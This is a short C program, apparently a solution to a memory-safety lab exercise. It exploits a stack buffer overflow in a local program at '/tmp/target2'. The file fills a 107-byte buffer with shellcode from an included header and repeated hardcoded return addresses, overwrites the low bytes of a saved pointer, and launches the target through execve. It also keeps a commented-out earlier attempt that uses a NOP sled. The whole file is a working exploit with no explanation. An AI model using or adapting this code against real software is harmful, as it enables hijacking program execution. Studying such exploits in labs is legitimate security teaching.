#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char shcode[sizeof(shellcode)];
  strncpy(shcode,shellcode, sizeof(shcode));
  char buffer[107];
  long *bufptr = (long*) buffer;

  for(int i =0; i < 26; i++){
	  *(bufptr + i) = (int)0xbffffd42;	//address of shellcode
  }

  for(int i = 0; i < strlen(shcode); i++){
	  buffer[i] = shcode[i];
  }
 
  buffer[105] = (char)0xaa; 
  buffer[106] = (char)0xa2;			//addr buffer[96]



  /*for(int i =0; i< 57; i++){
	  buffer[i] = (char)0x90;
  }
  for(int i = 57; i < 57 + strlen(shcode); i++){
	  buffer[i] = shcode[57-i];
  }

  buffer[102] = (char)0xdb;
  buffer[103] = (char)0xfd;
  buffer[104] = (char)0xff;
  buffer[105] =(char)0xbf;
  buffer[106] = (char)0x08;*/

  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
